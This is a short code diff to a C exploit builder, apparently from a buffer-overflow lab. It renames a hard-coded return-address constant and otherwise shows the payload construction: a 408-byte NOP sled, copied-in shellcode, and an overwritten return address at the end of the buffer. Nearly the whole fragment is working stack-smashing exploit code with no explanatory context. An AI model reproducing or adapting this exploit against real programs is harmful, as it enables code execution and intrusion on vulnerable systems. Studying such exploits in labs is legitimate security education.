@@ -9,13 +9,13 @@
 
 const int BSIZE = 408;
 const int SHSIZE = sizeof(shellcode) - 1;
-const uint32_t RET = 0xffffdb2c;
+const uint32_t ADD = 0xffffdb2c;
 
 void prep(char *buf) {
     memset(buf, 0x90, BSIZE);
     buf[BSIZE] = '\0';
     memcpy(buf, shellcode, SHSIZE);
-    *(uint32_t*)(buf + BSIZE - 4) = RET;
+    *(uint32_t*)(buf + BSIZE - 4) = ADD;
 }
 
 int main(void) {
